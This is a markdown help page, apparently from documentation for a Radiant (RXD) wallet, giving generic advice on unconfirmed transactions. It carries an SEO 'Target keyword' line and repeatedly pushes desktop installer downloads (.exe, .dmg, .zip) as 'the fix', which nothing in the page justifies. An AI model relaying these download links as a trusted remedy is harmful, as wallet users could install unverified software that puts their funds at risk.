<div align="center">

<img src="../assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.webp" alt="Photonic Wallet for Radiant (RXD) banner" width="100%">

# RXD transaction stuck unconfirmed

[![Website](https://img.shields.io/badge/Website-photonicwallet.org-7c3aed?style=for-the-badge)](https://photonicwallet.org) [![Release](https://img.shields.io/badge/Release-v3.0.4-00b4d8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://img.shields.io/badge/Docs-guides-0a0e1a?style=for-the-badge&logo=readthedocs&logoColor=white)](https://github.com/Radiant-projects/photonic-wallet-docs)

</div>

> **Short answer:** Most unconfirmed RXD payments confirm in later blocks; check the transaction ID on an explorer before resending.

---

## You'll see this if

- Payment shows pending
- Receiver sees nothing
- Balance looks reduced

## Why it happens

Low fees, a busy network, or a wallet that has not refreshed delay confirmation. More background lives in our guide on [photonic wallet connection error](photonic-wallet-connection-error.md) and on the [check RXD transactions](https://photonicwallet.org/guides/check-rxd-transaction).

## Fix it step by step

1. Copy the transaction ID.
2. Look it up on an explorer.
3. Wait several blocks.
4. Avoid sending again until it confirms or drops.

## If that didn't work

If the explorer never saw it, resync the wallet; the coins remain spendable. The [troubleshooting](https://photonicwallet.org/guides/troubleshooting) covers related cases, and [Check an RXD transaction on a block explorer](check-rxd-transaction-on-explorer.md) may match your situation.

## Prevention

Use the suggested fee shown by the wallet.

> [!WARNING]
> Photonic Wallet will never ask for your seed phrase. Never type it into a website, form or chat.

## FAQ

<details>
<summary><b>Can I cancel?</b></summary>

Not directly; unconfirmed payments either confirm or drop.

</details>

<details>
<summary><b>How long are blocks?</b></summary>

Roughly a few minutes each.

</details>

---

## Get the latest Photonic Wallet

The fix starts with the current desktop release, **[Photonic Wallet v3.0.4](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4)**.

<div align="center">

[![Download Photonic Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)

</div>

| Platform | File | Requirements |
|---|---|---|
| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |

> [!TIP]
> Compare the SHA-256 checksum with the table on the [tagged release](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) before you run the installer. Source code: [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet).

## Related guides

| Guide | |
|---|---|
| [Photonic Wallet connection error](photonic-wallet-connection-error.md) | Photonic Wallet guide |
| [Check an RXD transaction on a block explorer](check-rxd-transaction-on-explorer.md) | Photonic Wallet guide |
| [What are Glyph tokens on Radiant](what-are-glyph-tokens.md) | Photonic Wallet guide |
| [All Photonic guides](../README.md) | Docs index |

<sub>Target keyword: rxd transaction unconfirmed · [photonicwallet.org](https://photonicwallet.org) · [Download](https://photonicwallet.org/download)</sub>
